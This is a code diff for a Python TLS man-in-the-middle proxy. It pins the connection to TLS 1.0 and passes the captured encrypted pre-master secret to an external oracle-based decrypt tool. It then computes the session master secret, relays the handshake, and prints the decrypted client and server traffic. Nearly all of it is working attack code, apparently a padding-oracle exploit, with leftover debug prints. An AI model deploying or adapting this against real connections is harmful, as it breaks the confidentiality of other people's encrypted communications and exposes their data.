@@ -3,7 +3,9 @@
 import socket
 from tlslite.api import *
 from tlslite.constants import ContentType, HandshakeType
-from binascii import hexlify
+from binascii import hexlify, unhexlify
+from tlslite.mathtls import calcMasterSecret
+from tlslite.messages import ApplicationData
 import subprocess
 import sys
 
@@ -22,11 +24,14 @@ def handshakeProxy(c_conn, s_conn, oracle):
         else: break
     clientHello = result
 
-    c_conn.version = (3, 3) # TODO : Hardcoded version ?
+    c_conn.version = (3, 1) # Hardcoded version
 
     for result in c_conn._sendMsg(clientHello):
         yield result
 
+
+    # Send Server Hello, Certificate and Server Hello Done in one packet
+    s_conn.sock.buffer_writes = True
 
     # SERVER HELLO           S -> C
     for result in c_conn._getMsg(ContentType.handshake,
@@ -54,7 +59,6 @@ def handshakeProxy(c_conn, s_conn, oracle):
         yield result
 
 
-    # TODO : this part is optional
     # CERTIFICATE REQUEST   S -> C
     if 0:
         for result in c_conn._getMsg(ContentType.handshake,
@@ -77,7 +81,14 @@ def handshakeProxy(c_conn, s_conn, oracle):
     for result in s_conn._sendMsg(serverHelloDone):
         yield result
 
-    # TODO : this part is optional
+
+    s_conn.sock.flush()
+    s_conn.sock.buffer_writes = False
+
+
+    # Send Client Key Exchange, Change Cipher Spec, Finished in one message
+    c_conn.sock.buffer_writes = True
+
     # CERTIFICATE           C -> S
     if 0:
         for result in s_conn._getMsg(ContentType.handshake,
@@ -103,35 +114,137 @@ def handshakeProxy(c_conn, s_conn, oracle):
     epms = clientKeyExchange.encryptedPreMasterSecret
     if not oracle(epms):
         # YOU SHALL NOT PASS !
-        print("You shall not pass")
+        print("Shall not pass")
         return
 
-    print("Found trimmer !")
+    print("Decoding phase")
 
-    print(hexlify(epms).decode())
+    # Decrypt master key
+    dec = subprocess.Popen(['./decrypt', '{}:{}'.format(*oracleaddr), cert], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+    dec.stdin.write(hexlify(epms) + b'\n')
+    dec.stdin.close()
+    res = dec.stdout.readline().strip().split()[-1]
+    dec.stdout.close()
+    print(res)
+    premasterSecret = unhexlify(res)
+
 
     # If it's ok, continue
     for result in c_conn._sendMsg(clientKeyExchange):
         yield result
 
 
-    # Now we don't care about the SSL protocol, we just forward the records
-    # No, that doesn't look like the right way to do it.
-    try:
-        while True:
-            for cdata, sdata in zip(c_conn._recordLayer._recordSocket.recv(), s_conn._recordLayer._recordSocket.recv()):
-                if cdata in (0, 1):
-                    yield cdata
-                else:
-                    for result in s_conn._recordLayer._recordSocket._sockSendAll(cdata[0].write() + cdata[1]):
-                        yield result
-                if sdata in (0, 1):
-                    yield sdata
-                else:
-                    for result in c_conn._recordLayer._recordSocket._sockSendAll(sdata[0].write() + sdata[1]):
-                        yield result
-    except TLSAbruptCloseError:
-        pass
+    settings = HandshakeSettings()
+
+
+    masterSecret = calcMasterSecret(c_conn.version,
+                                    cipherSuite,
+                                    premasterSecret,
+                                    clientHello.random,
+                                    serverHello.random)
+
+    print(masterSecret)
+
+    s_conn._calcPendingStates(cipherSuite, masterSecret, 
+                              clientHello.random, serverHello.random, 
+                              settings.cipherImplementations)
+    c_conn._calcPendingStates(cipherSuite, masterSecret, 
+                              clientHello.random, serverHello.random, 
+                              settings.cipherImplementations)
+
+    print('foobar')
+
+    # CHANGE-CIPHER-SPEC   C -> S
+    for result in s_conn._getMsg(ContentType.change_cipher_spec):
+        if result in (0,1):
+            yield result
+    s_changeCipherSpec = result
+    for result in c_conn._sendMsg(s_changeCipherSpec):
+        yield result
+
+    s_conn._changeReadState()
+    c_conn._changeWriteState()
+
+    # SERVER-FINISHED   C -> S
+    for result in s_conn._getMsg(ContentType.handshake, HandshakeType.finished):
+        if result in (0,1):
+            yield result
+    server_finished = result
+    for result in c_conn._sendMsg(server_finished):
+        yield result
+
+    c_conn.sock.flush()
+    c_conn.sock.buffer_writes = False
+
+
+
+    # Send New Session Ticket, Change Cipher Spec, Finished in one message
+    s_conn.sock.buffer_writes = True
+
+    # NEW-SESSION-TICKET
+    for result in c_conn._getMsg(ContentType.handshake, HandshakeType.new_session_ticket):
+        if result in (0,1):
+            yield result
+    newSessionTicket = result
+    for result in s_conn._sendMsg(newSessionTicket):
+        yield result
+
+
+    # CHANGE-CIPHER-SPEC
+    for result in c_conn._getMsg(ContentType.change_cipher_spec):
+        if result in (0,1):
+            yield result
+    c_changeCipherSpec = result
+    for result in s_conn._sendMsg(c_changeCipherSpec):
+        yield result
+
+    c_conn._changeReadState()
+    s_conn._changeWriteState()
+
+
+    # SERVER-FINISHED
+    for result in c_conn._getMsg(ContentType.handshake, HandshakeType.finished):
+        if result in (0,1):
+            yield result
+    client_finished = result
+    for result in s_conn._sendMsg(client_finished):
+        yield result
+
+    s_conn.sock.flush()
+    s_conn.sock.buffer_writes = False
+
+    c_conn._handshakeDone(False)
+    s_conn._handshakeDone(False)
+
+
+    cont = True
+    while cont:
+        for c_data, s_data in zip(c_conn.readAsync(), s_conn.readAsync()):
+            if c_data in (0, 1):
+                yield c_data
+            elif not c_data:
+                # End connection
+                print('server ended')
+                cont = False
+            else:
+                print('c', c_data)
+                for result in s_conn.writeAsync(c_data):
+                    yield result
+            if s_data in (0, 1):
+                yield s_data
+            elif not s_data:
+                # End connection
+                print('client ended')
+                cont = False
+            else:
+                print('s', s_data)
+                for result in c_conn.writeAsync(s_data):
+                    yield result
+
+    c_conn.close()
+    s_conn.close()
+
+    print("The end")
 
 
 if __name__ == "__main__":
